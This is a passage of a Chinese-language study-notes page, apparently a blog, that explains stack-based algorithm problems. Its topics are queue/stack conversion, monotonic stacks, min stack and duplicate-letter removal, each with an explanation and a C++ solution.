</span>&#123; inStack.<span class="hljs-built_in">push</span>(x); &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">pop</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (outStack.<span class="hljs-built_in">empty</span>()) &#123;<br>            <span class="hljs-built_in">in2out</span>();<br>        &#125;<br>        <span class="hljs-type">int</span> x = outStack.<span class="hljs-built_in">top</span>();<br>        outStack.<span class="hljs-built_in">pop</span>();<br>        <span class="hljs-keyword">return</span> x;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">peek</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (outStack.<span class="hljs-built_in">empty</span>()) &#123;<br>            <span class="hljs-built_in">in2out</span>();<br>        &#125;<br>        <span class="hljs-keyword">return</span> outStack.<span class="hljs-built_in">top</span>();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">empty</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-keyword">return</span> inStack.<span class="hljs-built_in">empty</span>() &amp;&amp; outStack.<span class="hljs-built_in">empty</span>(); &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="用队列实现栈">用队列实现栈</h2><blockquote><p>使用两个队列实现栈的操作，其中 queue 1用于存储栈内的元素，queue2作为入栈操作的辅助队列。入栈操作时，首先将元素入队到 queue 2，然后将queue 1的全部元素依次出队并入队到 queue 2 ，此时 queue 2的前端的元素即为新入栈的元素，再将 queue 1和 queue 2互换，则 queue1的元素即为栈内的元素，queue 1的前端和后端分别对应栈顶和栈底。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyStack</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    queue&lt;<span class="hljs-type">int</span>&gt; queue1;<br>    queue&lt;<span class="hljs-type">int</span>&gt; queue2;<br>    <br>    <span class="hljs-built_in">MyStack</span>() &#123;&#125;<br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">push</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> </span>&#123;<br>        queue2.<span class="hljs-built_in">push</span>(x);<br>        <span class="hljs-keyword">while</span> (!queue1.<span class="hljs-built_in">empty</span>()) &#123;<br>            queue2.<span class="hljs-built_in">push</span>(queue1.<span class="hljs-built_in">front</span>());<br>            queue1.<span class="hljs-built_in">pop</span>();<br>        &#125;<br>        <span class="hljs-built_in">swap</span>(queue1, queue2);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">pop</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-type">int</span> x = queue1.<span class="hljs-built_in">front</span>();<br>        queue1.<span class="hljs-built_in">pop</span>();<br>        <span class="hljs-keyword">return</span> x;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">top</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-keyword">return</span> queue1.<span class="hljs-built_in">front</span>(); &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">empty</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-keyword">return</span> queue1.<span class="hljs-built_in">empty</span>(); &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="三合一">三合一</h2><blockquote><p>在单个连续内存数组中有效地模拟三个独立的栈，通过计算索引来隔离每个栈的数据。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">TripleInOne</span> &#123;<br><span class="hljs-keyword">private</span>:<br>    vector&lt;<span class="hljs-type">int</span>&gt; stack;<br>    <span class="hljs-type">int</span> stackSize;<br>    <span class="hljs-type">int</span> stackTops[<span class="hljs-number">3</span>]; <span class="hljs-comment">// 跟踪每个栈的顶部位置</span><br><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">TripleInOne</span>(<span class="hljs-type">int</span> stackSize) &#123;<br>        <span class="hljs-keyword">this</span>-&gt;stackSize = stackSize;<br>        stack.<span class="hljs-built_in">resize</span>(stackSize * <span class="hljs-number">3</span>);<br>        stackTops[<span class="hljs-number">0</span>] = stackTops[<span class="hljs-number">1</span>] = stackTops[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>; <span class="hljs-comment">// 初始化每个栈的栈顶位置为0</span><br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">push</span><span class="hljs-params">(<span class="hljs-type">int</span> stackNum, <span class="hljs-type">int</span> value)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (stackTops[stackNum] &lt; <span class="hljs-keyword">this</span>-&gt;stackSize) &#123; <span class="hljs-comment">// 检查栈是否已满</span><br>            stack[stackNum * <span class="hljs-keyword">this</span>-&gt;stackSize + stackTops[stackNum]] = value;<br>            stackTops[stackNum]++;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">pop</span><span class="hljs-params">(<span class="hljs-type">int</span> stackNum)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">isEmpty</span>(stackNum)) &#123;<br>            stackTops[stackNum]--;<br>            <span class="hljs-keyword">return</span> stack[stackNum * <span class="hljs-keyword">this</span>-&gt;stackSize + stackTops[stackNum]];<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>; <span class="hljs-comment">// 栈为空时返回-1</span><br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">peek</span><span class="hljs-params">(<span class="hljs-type">int</span> stackNum)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">isEmpty</span>(stackNum)) &#123;<br>            <span class="hljs-keyword">return</span> stack[stackNum * <span class="hljs-keyword">this</span>-&gt;stackSize + stackTops[stackNum] - <span class="hljs-number">1</span>];<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>; <span class="hljs-comment">// 栈为空时返回-1</span><br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isEmpty</span><span class="hljs-params">(<span class="hljs-type">int</span> stackNum)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> stackTops[stackNum] == <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="用栈操作构建数组">用栈操作构建数组</h2><blockquote><p>通过遍历 1 到 n 的数字，并结合栈的 "Push" 和 "Pop"操作，将栈中的元素逐步变为目标数组 target 中的元素。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;string&gt; <span class="hljs-title">buildArray</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; target, <span class="hljs-type">int</span> n)</span> </span>&#123;<br>        vector&lt;string&gt; res;<br>        <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n &amp;&amp; index &lt; target.<span class="hljs-built_in">size</span>(); i++) &#123;<br>            res.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&quot;Push&quot;</span>);<br>            <span class="hljs-keyword">if</span> (target[index] == i) &#123;<br>                index++;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                res.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&quot;Pop&quot;</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="单调栈">2. 单调栈</h1><blockquote><p>单调栈是一种特殊的栈数据结构，其特点在于栈内元素保持单调性。单调栈可以分为单调递增栈和单调递减栈两种类型。</p><ol type="1"><li><p><strong>单调递增栈：</strong>在单调递增栈中，栈内元素从栈底到栈顶逐渐增大。当一个新元素要入栈时，如果该元素比栈顶元素大，则直接入栈；如果该元素比栈顶元素小，则弹出栈顶元素，直到栈顶元素小于或等于该元素，然后再将该元素入栈。</p></li><li><p><strong>单调递减栈：</strong>在单调递减栈中，栈内元素从栈底到栈顶逐渐减小。当一个新元素要入栈时，如果该元素比栈顶元素小，则直接入栈；如果该元素比栈顶元素大，则弹出栈顶元素，直到栈顶元素大于或等于该元素，然后再将该元素入栈。</p></li></ol><p>单调栈常用于解决一些与找到局部最大值或局部最小值相关的问题，例如找到数组中每个元素的下一个更大元素或下一个更小元素等。由于单调栈可以维护一定的单调性，因此可以通过栈来高效地找到这些局部最值。</p></blockquote><h2 id="下一个更大元素-i">下一个更大元素 I</h2><blockquote><ul><li>第 1 个子问题：如何更高效地计算 <em>nums</em>2中每个元素右边的第一个更大的值（单调递减栈）；</li><li>第 2 个子问题：如何存储第 1 个子问题的结果（哈希表）。</li></ul></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">nextGreaterElement</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums1, vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums2)</span> </span>&#123;<br>        unordered_map&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt; hashmap;<br>        stack&lt;<span class="hljs-type">int</span>&gt; st;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = nums2.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>            <span class="hljs-type">int</span> num = nums2[i];<br>            <span class="hljs-keyword">while</span> (!st.<span class="hljs-built_in">empty</span>() &amp;&amp; num &gt;= st.<span class="hljs-built_in">top</span>()) &#123;<br>                st.<span class="hljs-built_in">pop</span>();<br>            &#125;<br>            hashmap[num] = st.<span class="hljs-built_in">empty</span>() ? <span class="hljs-number">-1</span> : st.<span class="hljs-built_in">top</span>();<br>            st.<span class="hljs-built_in">push</span>(num);<br>        &#125;<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">res</span><span class="hljs-params">(nums1.size())</span></span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nums1.<span class="hljs-built_in">size</span>(); ++i) &#123;<br>            res[i] = hashmap[nums1[i]];<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="柱状图中最大的矩形">柱状图中最大的矩形</h2><blockquote><p>使用单调递增栈确定左边界和右边界（小于heights[i]）</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">largestRectangleArea</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; heights)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n=heights.<span class="hljs-built_in">size</span>();<br>        stack&lt;<span class="hljs-type">int</span>&gt; leftEdge,rightEdge;<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">left</span><span class="hljs-params">(n)</span>,<span class="hljs-title">right</span><span class="hljs-params">(n)</span></span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)&#123;<br>            <span class="hljs-keyword">while</span>(!leftEdge.<span class="hljs-built_in">empty</span>() &amp;&amp; heights[i]&lt;=heights[leftEdge.<span class="hljs-built_in">top</span>()])&#123;<br>                leftEdge.<span class="hljs-built_in">pop</span>();<br>            &#125;<br>            left[i]=leftEdge.<span class="hljs-built_in">empty</span>()?<span class="hljs-number">-1</span>:leftEdge.<span class="hljs-built_in">top</span>();<br>            leftEdge.<span class="hljs-built_in">push</span>(i);<br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=n<span class="hljs-number">-1</span>;i&gt;=<span class="hljs-number">0</span>;i--)&#123;<br>            <span class="hljs-keyword">while</span>(!rightEdge.<span class="hljs-built_in">empty</span>() &amp;&amp; heights[i]&lt;=heights[rightEdge.<span class="hljs-built_in">top</span>()])&#123;<br>                rightEdge.<span class="hljs-built_in">pop</span>();<br>            &#125;<br>            right[i]=rightEdge.<span class="hljs-built_in">empty</span>()?n:rightEdge.<span class="hljs-built_in">top</span>();<br>            rightEdge.<span class="hljs-built_in">push</span>(i);<br>        &#125;<br>        <span class="hljs-type">int</span> ans=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)&#123;<br>            ans=<span class="hljs-built_in">max</span>(ans,(right[i]-left[i]<span class="hljs-number">-1</span>)*heights[i]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="每日温度">每日温度</h2><blockquote><p>维护一个存储下标的单调栈，从栈底到栈顶的下标对应的温度列表中的温度依次递减。如果一个下标在单调栈里，则表示尚未找到下一次温度更高的下标。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">dailyTemperatures</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; temperatures)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = temperatures.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">ans</span><span class="hljs-params">(n)</span></span>;<br>        stack&lt;<span class="hljs-type">int</span>&gt; s;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>            <span class="hljs-keyword">while</span> (!s.<span class="hljs-built_in">empty</span>() &amp;&amp; temperatures[i] &gt; temperatures[s.<span class="hljs-built_in">top</span>()]) &#123;<br>                <span class="hljs-type">int</span> previousIndex = s.<span class="hljs-built_in">top</span>();<br>                ans[previousIndex] = i - previousIndex;<br>                s.<span class="hljs-built_in">pop</span>();<br>            &#125;<br>            s.<span class="hljs-built_in">push</span>(i);<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="股票价格跨度">股票价格跨度</h2><blockquote><p>往前数最多有连续多少日的股票价格是小于等于今日股票价格的，即需要求出每个值与上一个更大元素之间的下标之差。通过维护一个单调递减的栈来快速计算当前价格的跨度。栈由一对整数(pair&lt;int,int&gt;)组成，其中pair的第一个整数表示价格的索引，第二个整数表示价格的值。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">StockSpanner</span> &#123;<br><span class="hljs-keyword">private</span>:<br>    stack&lt;pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;&gt; st;<br>    <span class="hljs-type">int</span> idx;<br><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">StockSpanner</span>() &#123;<br>        <span class="hljs-keyword">this</span>-&gt;st.<span class="hljs-built_in">emplace</span>(<span class="hljs-number">-1</span>, INT_MAX);<br>        <span class="hljs-keyword">this</span>-&gt;idx = <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">next</span><span class="hljs-params">(<span class="hljs-type">int</span> price)</span> </span>&#123;<br>        idx++;<br>        <span class="hljs-keyword">while</span> (price &gt;= <span class="hljs-keyword">this</span>-&gt;st.<span class="hljs-built_in">top</span>().second) &#123;<br>            st.<span class="hljs-built_in">pop</span>();<br>        &#125;<br>        <span class="hljs-type">int</span> ret = idx - <span class="hljs-keyword">this</span>-&gt;st.<span class="hljs-built_in">top</span>().first;<br>        st.<span class="hljs-built_in">emplace</span>(idx, price);<br>        <span class="hljs-keyword">return</span> ret;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="接雨水">接雨水</h2><blockquote><p>维护一个单调递减的栈，在遍历过程中，每当遇到一个高度大于栈顶元素的柱子时，即栈中的元素构成了一个“凹槽”，说明可以形成一个可以盛水的区域。此时弹出栈顶元素，计算当前能够接到的雨水量。</p><p>基本场景：为数组的每一个元素寻找右边第一个比它大的元素。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">trap</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; height)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = height.<span class="hljs-built_in">size</span>();<br>        stack&lt;<span class="hljs-type">int</span>&gt; st;<br>        <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>            <span class="hljs-keyword">while</span> (!st.<span class="hljs-built_in">empty</span>() &amp;&amp; height[i] &gt; height[st.<span class="hljs-built_in">top</span>()]) &#123;<br>                <span class="hljs-type">int</span> bottom = st.<span class="hljs-built_in">top</span>();<br>                st.<span class="hljs-built_in">pop</span>();<br>                <span class="hljs-keyword">if</span> (st.<span class="hljs-built_in">empty</span>()) &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                <span class="hljs-type">int</span> left = st.<span class="hljs-built_in">top</span>();<br>                <span class="hljs-type">int</span> currWidth = i - left - <span class="hljs-number">1</span>;<br>                <span class="hljs-type">int</span> currHeight = <span class="hljs-built_in">min</span>(height[i], height[left]) - height[bottom];<br>                ans += currWidth * currHeight;<br>            &#125;<br>            st.<span class="hljs-built_in">push</span>(i);<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="最小大栈">3. 最小/大栈</h1><h2 id="最小栈">最小栈</h2><blockquote><p>使用辅助栈存储当前栈对应的最小值。对于栈来说，如果一个元素 a在入栈时，栈里有其它的元素 b, c,d，那么无论这个栈在之后经历了什么操作，只要 a 在栈中，b, c, d就一定在栈中，因为在 a 被弹出之前，b, c, d不会被弹出。因此，在操作过程中的任意一个时刻，只要栈顶的元素是a，那么我们就可以确定栈里面现在的元素一定是 a, b, c,d。那么，我们可以在每个元素 a 入栈时把当前栈的最小值 m存储起来。在这之后无论何时，如果栈顶元素是a，我们就可以直接返回存储的最小值 m。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MinStack</span> &#123;<br><span class="hljs-keyword">private</span>:<br>    stack&lt;<span class="hljs-type">int</span>&gt; st;<br>    stack&lt;<span class="hljs-type">int</span>&gt; minSt;<br><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">MinStack</span>() &#123;<br>        minSt.<span class="hljs-built_in">push</span>(INT_MAX);<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">push</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> </span>&#123;<br>        minSt.<span class="hljs-built_in">push</span>(<span class="hljs-built_in">min</span>(minSt.<span class="hljs-built_in">top</span>(),x));<br>        st.<span class="hljs-built_in">push</span>(x);<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">pop</span><span class="hljs-params">()</span> </span>&#123;<br>        minSt.<span class="hljs-built_in">pop</span>();<br>        st.<span class="hljs-built_in">pop</span>();<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">top</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> st.<span class="hljs-built_in">top</span>();<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">getMin</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> minSt.<span class="hljs-built_in">top</span>();<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="最大栈">最大栈</h2><blockquote><p>使用双栈，一个存放所有的数值，一个存放到当前数值为止的最大值。当要弹出最大值的时候，需要一个辅助的栈，存放数值栈中不是最大值的那些数字，弹出最大值之后，再把辅助栈中的所有元素Push到栈中。</p></blockquote><h1 id="字符串去重问题">4. 字符串去重问题</h1><h2 id="去除重复字母">去除重复字母</h2><blockquote><p>字典序：在字典序中，首先比较字符串的第一个字符，如果两个字符串的第一个字符不同，那么按照字符的ASCII码值进行比较；如果两个字符串的第一个字符相同，则继续比较下一个字符，直到找到第一个不同的字符为止。比较时，大写字母排在小写字母之前，例如'a'在'b'之前，而'A'在'a'之前。如果一个字符串是另一个字符串的前缀，则较短的字符串被视为较小。</p><p>首先考虑一个简单的问题：给定一个字符串 s，如何去掉其中的一个字符ch，使得得到的字符串字典序最小呢？答案是：找出最小的满足 s[i]&gt;s[i+1]的下标 i，并去除字符s[i]。为了叙述方便，下文中称这样的字符为「关键字符」。在理解这一点之后，就可以着手本题了。一个直观的思路是：我们在字符串s中找到「关键字符」，去除它，然后不断进行这样的循环。使用单调栈来维护去除「关键字符」后得到的字符串，单调栈满足栈底到栈顶的字符递增。如果栈顶字符大于当前字符s[i]，说明栈顶字符为「关键字符」，故应当被去除。去除后，新的栈顶字符就与s[i] 相邻了，我们继续比较新的栈顶字符与 s[i]的大小。重复上述操作，直到栈为空或者栈顶字符不大于 s[i]。</p><p>我们还遗漏了一个要求：原字符串 s中的每个字符都需要出现在新字符串中，且只能出现一次。为了让新字符串满足该要求，之前讨论的算法需要进行以下两点的更改：1.在考虑字符 s[i] 时，如果它已经存在于栈中，则不能加入字符s[i]。为此，需要记录每个字符是否出现在栈中。2.在弹出栈顶字符时，如果字符串在后面的位置上再也没有这一字符，则不能弹出栈顶字符。为此，需要记录每个字符的剩余数量，当这个值为0 时，就不能弹出栈顶字符了。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">string <span class="hljs-title">removeDuplicateLetters</span><span class="hljs-params">(string s)</span> </span>&#123;<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">vis</span><span class="hljs-params">(<span class="hljs-number">26</span>)</span>, <span class="hljs-title">num</span><span class="hljs-params">(<span class="hljs-number">26</span>)</span></span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> ch : s) &#123;<br>            num[ch - <span class="hljs-string">&#x27;a&#x27;</span>]++;<br>        &#125;<br>        string st;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> ch : s) &#123;<br>            <span class="hljs-keyword">if</span> (!vis[ch - <span class="hljs-string">&#x27;a&#x27;</span>]) &#123;<br>                <span class="hljs-keyword">while</span> (!st.<span class="hljs-built_in">empty</span>() &amp;&amp; st.<span class="hljs-built_in">back</span>() &gt; ch) &#123;<br>                    <span class="hljs-keyword">if</span> (num[st.<span class="hljs-built_in">back</span>() - <span 